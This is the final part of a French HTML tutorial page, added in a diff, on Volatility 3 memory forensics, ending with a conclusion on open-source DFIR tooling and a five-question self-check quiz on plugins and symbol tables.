+        <ul><li>💰 <strong>Volexity Volcano</strong> (commercial, par les créateurs originaux) : <<a href="https://www.volexity.com/products-overview/volcano/" target="_blank" rel="noopener">https://www.volexity.com/products-overview/volcano/</a>></li><li>💰 <strong>Magnet AXIOM Cyber</strong> : <<a href="https://www.magnetforensics.com" target="_blank" rel="noopener">https://www.magnetforensics.com</a>></li><li>🔧 <strong>Rekall</strong> (fork de Vol2 par Google, peu maintenu désormais) : <<a href="https://github.com/google/rekall" target="_blank" rel="noopener">https://github.com/google/rekall</a>></li></ul>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s21" data-section-id="s21">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">21</span> Conclusion</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p>Volatility 3 est <strong>la pièce manquante incontournable</strong> dans toute boîte à outils DFIR sérieuse. Là où IPED, Autopsy et Plaso analysent ce qui est sur le <strong>disque</strong>, Volatility révèle ce qui se passait en <strong>mémoire vive</strong> au moment précis de la capture — un domaine que <strong>les attaquants modernes exploitent massivement</strong> avec leurs malwares fileless, leur process hollowing, leurs implants Cobalt Strike résidant uniquement en RAM.</p>
+        <p>Sa <strong>richesse fonctionnelle</strong> (150+ plugins), son <strong>support multi-OS</strong>, sa <strong>détection automatique</strong> d'OS et sa <strong>communauté DFIR</strong> en font l'<strong>outil de référence open source</strong> dans le domaine — et probablement pour les années à venir, malgré la concurrence commerciale grandissante de Volexity Volcano.</p>
+        <p>Néanmoins, c'est un <strong>outil exigeant</strong> : il demande de comprendre les structures internes des OS, de savoir interpréter des faux positifs, de maîtriser la génération de symboles, et de combiner intelligemment plusieurs plugins pour ne pas se faire tromper par des techniques d'évasion. C'est un outil d'<strong>expert</strong>, pas un outil clé en main.</p>
+        <p>Avec cette série de <strong>5 tutoriels</strong> (IPED, Autopsy, MVT, Plaso, Volatility 3), tu disposes maintenant d'une <strong>chaîne forensique open source complète</strong> :</p>
+        <table><thead><tr><th>Outil</th><th>Domaine</th></tr></thead><tbody><tr><td><strong>IPED</strong></td><td>Disque (gros volumes, parsing massif)</td></tr><tr><td><strong>Autopsy</strong></td><td>Disque (interface graphique, généraliste)</td></tr><tr><td><strong>MVT</strong></td><td>Mobile (détection de spyware Pegasus & co)</td></tr><tr><td><strong>Plaso + Timesketch</strong></td><td>Timeline multi-sources, visualisation</td></tr><tr><td><strong>Volatility 3</strong></td><td><strong>RAM, dumps mémoire, malware fileless</strong></td></tr></tbody></table>
+        <p>Ces 5 outils, <strong>gratuits et open source</strong>, rivalisent avec un arsenal commercial valant facilement <strong>30 000 € à 80 000 € de licences annuelles</strong>. Combinés intelligemment, ils couvrent <strong>95 %</strong> des besoins forensiques d'un CERT, d'une équipe DFIR ou d'un service d'enquête.</p>
+        <p>Pour bien démarrer avec Volatility 3, je recommande de :</p>
+        <ol><li>Installer Volatility 3 via <code>pip</code> dans un venv.</li><li>Télécharger les <strong>symbol packs Windows</strong> depuis volatilityfoundation.org.</li><li>Récupérer un <strong>échantillon de test</strong> depuis le wiki Volatility (Stuxnet, Cridex, etc.).</li><li>Lancer la séquence <code>windows.info</code> → <code>windows.pstree</code> → <code>windows.netscan</code> → <code>windows.malfind</code> → <code>timeliner.Timeliner</code>.</li><li>T'entraîner sur <strong>MemLabs</strong> ou un <strong>TryHackMe Volatility Room</strong> pour appliquer en CTF.</li><li>Lire <strong>The Art of Memory Forensics</strong> — incontournable pour maîtriser réellement l'outil.</li><li>Intégrer la sortie <code>timeliner</code> dans <strong>Plaso/Timesketch</strong> pour une vision unifiée disque + RAM.</li></ol>
+        <p>Bonnes chasses en mémoire ! 🧠🔍</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <!-- Quiz final -->
+      <section class="tuto-quiz" id="quiz">
+        <header class="tuto-quiz-header">
+          <span class="tuto-quiz-icon">🎯</span>
+          <h2>Quiz final — Vérifie ce que tu as appris</h2>
+        </header>
+        <div class="tuto-quiz-desc">
+          5 questions issues du tutoriel. Il faut <strong>≥ 80 %</strong> pour débloquer le trophée
+          <strong>« Volatility 3 maîtrisé »</strong>. Tu peux retenter autant de fois que nécessaire.
+        </div>
+
+        <!-- Question 1 -->
+        <div class="tuto-quiz-question" data-correct="1"
+             data-feedback-ok="✓ Exact. Volatility 3 abandonne les profiles (un par version OS) au profit de <em>symbol tables</em> JSON téléchargées dynamiquement depuis le dépôt officiel."
+             data-feedback-ko="✗ La bonne réponse : les <em>symbol tables</em> téléchargées remplacent les profiles compilés. Plus de gestion manuelle des versions OS.">
+          <div class="tuto-quiz-question-text">1. Quelle est la <strong>différence principale</strong> entre Volatility 2 et Volatility 3 ?</div>
+          <div class="tuto-quiz-options">
+            <button class="tuto-quiz-option" type="button">Volatility 3 n'analyse que Windows</button>
+            <button class="tuto-quiz-option" type="button">Volatility 3 utilise des <em>symbol tables</em> téléchargées au lieu de profiles compilés</button>
+            <button class="tuto-quiz-option" type="button">Volatility 3 est uniquement en ligne de commande, Volatility 2 avait une GUI</button>
+            <button class="tuto-quiz-option" type="button">Volatility 3 est commercial, Volatility 2 est open source</button>
+          </div>
+          <div class="tuto-quiz-feedback"></div>
+        </div>
+
+        <!-- Question 2 -->
+        <div class="tuto-quiz-question" data-correct="2"
+             data-feedback-ok="✓ Exact. <code>windows.pslist</code> liste les processus actifs (PID, PPID, name, threads). Pour les processus cachés, utiliser <code>windows.psscan</code>."
+             data-feedback-ko="✗ La bonne réponse : <code>windows.pslist</code>. Pour les processus cachés (rootkits), <code>windows.psscan</code> fait un scan exhaustif.">
+          <div class="tuto-quiz-question-text">2. Quel plugin Windows liste les <strong>processus</strong> en mémoire ?</div>
+          <div class="tuto-quiz-options">
+            <button class="tuto-quiz-option" type="button">windows.proclist</button>
+            <button class="tuto-quiz-option" type="button">windows.ps</button>
+            <button class="tuto-quiz-option" type="button">windows.pslist</button>
+            <button class="tuto-quiz-option" type="button">windows.processes</button>
+          </div>
+          <div class="tuto-quiz-feedback"></div>
+        </div>
+
+        <!-- Question 3 -->
+        <div class="tuto-quiz-question" data-correct="1"
+             data-feedback-ok="✓ Exact. <code>windows.malfind</code> détecte les régions mémoire avec des permissions suspectes (RWX) et un contenu exécutable — typique d'une injection de code (DLL injection, process hollowing)."
+             data-feedback-ko="✗ La bonne réponse : <code>windows.malfind</code>. Il identifie les régions mémoire suspectes (RWX + contenu exécutable), signature classique d'injection.">
+          <div class="tuto-quiz-question-text">3. Quel plugin permet de détecter du <strong>code injecté</strong> dans la mémoire d'un processus ?</div>
+          <div class="tuto-quiz-options">
+            <button class="tuto-quiz-option" type="button">windows.dlllist</button>
+            <button class="tuto-quiz-option" type="button">windows.malfind</button>
+            <button class="tuto-quiz-option" type="button">windows.handles</button>
+            <button class="tuto-quiz-option" type="button">windows.envars</button>
+          </div>
+          <div class="tuto-quiz-feedback"></div>
+        </div>
+
+        <!-- Question 4 -->
+        <div class="tuto-quiz-question" data-correct="1"
+             data-feedback-ok="✓ Exact. Les <em>symbol tables</em> sont des fichiers JSON décrivant les structures internes du kernel (EPROCESS, KTHREAD, etc.) pour une version OS précise. Volatility 3 les télécharge à la volée."
+             data-feedback-ko="✗ La bonne réponse : un fichier JSON décrivant les structures kernel d'un OS, nécessaire pour interpréter correctement le dump mémoire.">
+          <div class="tuto-quiz-question-text">4. Qu'est-ce qu'une <em>symbol table</em> Volatility ?</div>
+          <div class="tuto-quiz-options">
+            <button class="tuto-quiz-option" type="button">Un fichier qui contient les commandes Python du framework</button>
+            <button class="tuto-quiz-option" type="button">Un fichier JSON décrivant les structures internes du noyau d'un OS donné, indispensable pour interpréter le dump mémoire</button>
+            <button class="tuto-quiz-option" type="button">Une base de signatures d'antivirus</button>
+            <button class="tuto-quiz-option" type="button">Un index des plugins disponibles</button>
+          </div>
+          <div class="tuto-quiz-feedback"></div>
+        </div>
+
+        <!-- Question 5 -->
+        <div class="tuto-quiz-question" data-correct="1"
+             data-feedback-ok="✓ Exact. <code>windows.netscan</code> scanne la mémoire pour trouver les sockets TCP/UDP. Le plugin <code>netstat</code> existe aussi mais sur des versions plus anciennes."
+             data-feedback-ko="✗ La bonne réponse : <code>windows.netscan</code>. C'est le plugin moderne pour énumérer sockets et connexions dans Volatility 3.">
+          <div class="tuto-quiz-question-text">5. Quelle commande affiche les connexions réseau actives dans un dump Windows ?</div>
+          <div class="tuto-quiz-options">
+            <button class="tuto-quiz-option" type="button">vol -f dump.raw windows.netstat</button>
+            <button class="tuto-quiz-option" type="button">vol -f dump.raw windows.netscan</button>
+            <button class="tuto-quiz-option" type="button">vol -f dump.raw windows.connections</button>
+            <button class="tuto-quiz-option" type="button">vol -f dump.raw windows.tcpscan</button>
+          </div>
+          <div class="tuto-quiz-feedback"></div>
+        </div>
+
+        <div class="tuto-quiz-result">
+          <div class="tuto-quiz-result-score"></div>
+          <div class="tuto-quiz-result-msg"></div>
+          <button class="tuto-quiz-restart" type="button">↻ Recommencer le quiz</button>
+        </div>
+      </section>
+
+      <footer style="margin:2.5rem 0 4rem;padding-top:1.5rem;border-top:1px solid var(--border);text-align:center">
+        <p style="color:var(--muted);font-size:.85rem;margin-bottom:1rem">
+          Tutoriel terminé ?
+          <a href="../fiches/volatility3.html" style="color:var(--cyan)">📚 Consulter la fiche Volatility 3</a>
+          ·
+          <a href="../tutoriels.html" style="color:var(--cyan)">← Retour aux tutoriels</a>
+        </p>
+        <p style="color:var(--dim);font-size:.7rem">
+          CAS-IN · Tutoriel Volatility 3 v1.0 · Contenu open source · Pédagogie active
+        </p>
+      </footer>
+
+    </article>
+  </div>
+</main>
+
+<script src="../js/core/cas-in-navbar.js" defer></script>
+<script src="../js/pages/tutoriels-app.js" defer></script>
+</body>
+</html>
